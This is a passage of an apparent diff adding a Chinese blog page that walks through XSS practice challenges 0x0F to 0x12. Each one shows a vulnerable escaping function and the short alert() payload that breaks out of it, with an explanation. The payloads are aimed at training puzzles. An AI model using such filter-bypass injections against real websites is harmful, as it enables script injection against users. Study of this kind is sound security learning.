class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">            .replace(/&quot;/g, &#x27;</span><span class="string">&quot;&#x27;)</span></span><br><span class="line"><span class="string">            .replace(/&lt;/g, &#x27;&lt;&#x27;)</span></span><br><span class="line"><span class="string">            .replace(/&gt;/g, &#x27;&gt;&#x27;)</span></span><br><span class="line"><span class="string">            .replace(/\//g, &#x27;/&#x27;)</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  return `&lt;img src onerror=&quot;</span><span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;$&#123;escapeHtml(input)&#125;&#x27;</span>)<span class="string">&quot;&gt;`</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里对上述符号均进行的是HTML编码，并没有什么屌用，浏览器解析的时候会还原出来，直接闭合就好了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;);alert(&#x27;1</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><p>不懂这道题的意义，直接弹</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><p>server code:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (s) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">escapeJs</span> (s) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">String</span>(s)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;\\\\&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/`/g</span>, <span class="string">&#x27;\\`&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;\\74&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;\\76&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;\\/&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\n/g</span>, <span class="string">&#x27;\\n&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\r/g</span>, <span class="string">&#x27;\\r&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\t/g</span>, <span class="string">&#x27;\\t&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\f/g</span>, <span class="string">&#x27;\\f&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\v/g</span>, <span class="string">&#x27;\\v&#x27;</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, &#x27;\\b&#x27;)</span></span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\0/g</span>, <span class="string">&#x27;\\0&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = &#x27;javascript:console.log(&quot;<span class="subst">$&#123;s&#125;</span>&quot;)&#x27;</span></span><br><span class="line"><span class="string">  var a = document.createElement(&#x27;a&#x27;)</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要看懂题目，这里替换的字符串里的“两个反斜线”其实是指替换成一个反斜线，因为还要起到一个转义的作用<br>先看payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;);alert(&quot;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>主要原因如下：</p>
+<blockquote>
+<p><code>\</code>本身是作为转义符号的，转义后面紧接的字符，有的字符转义会变成其他具体含义，像 <code>\n</code>之类的，<code>&quot;</code>被转义他仍是双引号，只是在当前失去意义而已，而这里由于外面包裹的是单引号，里面的内容被认为是一个字符串，双引号本身就没有实际含义，所以这里使用 <code>\&quot;</code>其实是没有用的，而在后面被拼接到href后，就会发挥双引号作用</p>
+</blockquote>
+<p>如果截图浏览器Element选项就能看到a标签：<br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2018/08/21/xss/1.png" alt="1" data-caption="1" loading="lazy"></p>
+<h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><p>server code:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">escape</span> (s) &#123;</span><br><span class="line">  s = s.<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="string">&#x27;&quot;);&lt;/script&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只替换一次，自己再加上一个反斜线转义前面的反斜线即可</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">&quot;);alert(1)//</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还是学到了些东西，尤其是正则的匹配以及编码的知识</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://www.bodkin.ren/index.php/archives/592/">haozi&#x2F;xss-demo 在线做题笔记</a><br><a target="_blank" rel="noopener" href="https://mntn0x.github.io/2018/06/06/xssGame-2/">新的xss挑战</a></p>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E6%80%BB%E7%BB%93/" rel="tag">总结</a>
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1688978534245"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+</div>
+        <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00"><span class="toc-number">1.</span> <span class="toc-text">0x00</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01"><span class="toc-number">2.</span> <span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02"><span class="toc-number">3.</span> <span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03"><span class="toc-number">4.</span> <span class="toc-text">0x03</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04"><span class="toc-number">5.</span> <span class="toc-text">0x04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05"><span class="toc-number">6.</span> <span class="toc-text">0x05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06"><span class="toc-number">7.</span> <span class="toc-text">0x06</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07"><span class="toc-number">8.</span> <span class="toc-text">0x07</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08"><span class="toc-number">9.</span> <span class="toc-text">0x08</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09"><span class="toc-number">10.</span> <span class="toc-text">0x09</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0A"><span class="toc-number">11.</span> <span class="toc-text">0x0A</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0B"><span class="toc-number">12.</span> <span class="toc-text">0x0B</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0C"><span class="toc-number">13.</span> <span class="toc-text">0x0C</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0D"><span class="toc-number">14.</span> <span class="toc-text">0x0D</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0E"><span class="toc-number">15.</span> <span class="toc-text">0x0E</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0F"><span class="toc-number">16.</span> <span class="toc-text">0x0F</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10"><span class="toc-number">17.</span> <span class="toc-text">0x10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11"><span class="toc-number">18.</span> <span class="toc-text">0x11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12"><span class="toc-number">19.</span> <span class="toc-text">0x12</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number"></span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number"></span> <span class="toc-text">参考文章</span></a>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+    </div>
+    <div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="Search"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+
+    
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+
+</body>
+
+</html>
